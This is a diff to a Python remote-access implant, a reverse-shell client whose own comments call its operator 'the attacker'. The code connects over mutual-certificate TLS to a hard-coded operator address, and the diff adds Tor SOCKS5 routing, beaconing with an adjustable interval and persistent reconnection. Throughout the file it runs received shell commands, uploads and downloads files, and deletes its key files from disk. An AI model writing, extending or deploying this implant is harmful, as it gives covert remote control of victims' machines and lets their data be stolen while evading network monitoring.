@@ -1,16 +1,18 @@
 #!/usr/bin/python3
-import socket, platform, ssl, subprocess
+import socket, platform, ssl, subprocess, socks
 from printlib import *
-from time import time
-from os import remove, path
+from time import time, sleep
+from os import remove, path, getpid, kill
 from datetime import datetime
 from sys import exit
+from signal import SIGTERM
 
 remote_ip = '10.0.0.18'
 remote_port = 8080
 server_sni_hostname = ''
 VERBOSE = True
-
+DEVNULL = subprocess.DEVNULL
+BEACON_INTERVAL = 10    #in seconds
 
 def create_keys():
     server_cert ='''\
@@ -104,13 +106,15 @@ def delete_keys():
 def sysinfo():
     date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
     sys_info ="""
+Current PID: {}
+
 Local Time: {}
 system: {}
 release: {}
 version: {}
 machine: {}
 processor: {}
-node: {}""".format(date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
+node: {}""".format(getpid(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
     return sys_info
 
 def send_data(conn, plain_text):
@@ -128,6 +132,8 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
         conn.send(data)
         data = f.read(128)
     conn.send("[END]".encode('utf-8'))
+    if VERBOSE:
+        print_info("Done!")
     f.close()
 
 def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
@@ -138,7 +144,8 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
         data = conn.recv(128)
         if data.endswith(b"[END]"):
             f.write(data.rstrip(b"[END]"))
-            print_good("Transfer completed")
+            if VERBOSE:
+                print_good("Transfer completed")
             f.close()
             break
         else:
@@ -146,14 +153,25 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
     f.close()
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
+    global BEACON_INTERVAL
+
     data = ""
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile='server_cert')
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+    s = socks.socksocket()
+    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     conn = context.wrap_socket(s, server_side=False)
-    conn.connect((remote_ip, remote_port))
+    try:
+        if VERBOSE:
+            print_info("Trying to connect --> {}:{}".format(remote_ip,remote_port))
+        conn.connect((remote_ip, remote_port))
+        if VERBOSE:
+            print_good("Connected!")
+    except:
+        raise ConnectionRefusedError
     if VERBOSE:
         print_good("SSL established. Peer: {}".format(conn.getpeercert()))
 
@@ -163,14 +181,22 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             recv = conn.recv(128)
             recv_decoded = recv.decode('utf-8')
             data = data + recv_decoded
-        data = data.rstrip('[END]')
+        data = data[:-5]
         if VERBOSE:
             print_info("Received:\n" + data)
-        if 'kill' in data: # if we got terminate order from the attacker, close the socket and break the loop
+        if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
             if VERBOSE:
                 print_warn("Received kill command")
             conn.close()
+            kill(getpid(), SIGTERM)
             break 
+        elif "[BEACON]" in data:
+            temp = data.strip("[BEACON]")
+            if temp == "?":
+                send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
+            elif temp.isdigit():
+                BEACON_INTERVAL = int(data.strip("[BEACON]"))
+                send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
         elif "get" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
@@ -192,14 +218,39 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             #cmds = data.split()
             if VERBOSE:
                 print_info("Received cmd --> {}".format(data))
-            output = subprocess.getoutput(data)
-            send_data(conn, output) # send back the result
+            output = subprocess.run(data.split(), shell=True, stdin=DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+            #output = subprocess.Popen(data.split(), shell=True, stdin=DEVNULL,stderr=DEVNULL,stdout=subprocess.PIPE)
+            #output = subprocess.check_output(data,shell=True, stderr=DEVNULL, stdin=DEVNULL )
+            #print(output)
+            if output.stderr != b"":
+                send_data(conn, output.stderr.decode('utf-8')) # send back the errors
+            elif output.stdout == b"":
+                send_data(conn, "ERROR --> {}".format(data))
+            else:
+                send_data(conn, output.stdout.decode('utf-8')) # send back the result
             data = "" #reset the data received
 
 def main ():
-    try:
-        create_keys()
-        connect(remote_ip,remote_port)
-    finally:
-        delete_keys()
+    while True:
+        try:
+            create_keys()
+            connect(remote_ip,remote_port)
+            delete_keys()
+        except ConnectionRefusedError:
+            if VERBOSE:
+                print_fail("Failed to connect")
+        except ConnectionResetError:
+            if VERBOSE:
+                print_fail("Remote end terminated the connection")
+        except ConnectionAbortedError:
+            exit()
+        except Exception as e:
+            if VERBOSE:
+                print(e)
+        finally:
+            delete_keys()
+            print_info("Sleeping for {}".format(BEACON_INTERVAL))
+            sleep(BEACON_INTERVAL)
+            
+
 main()
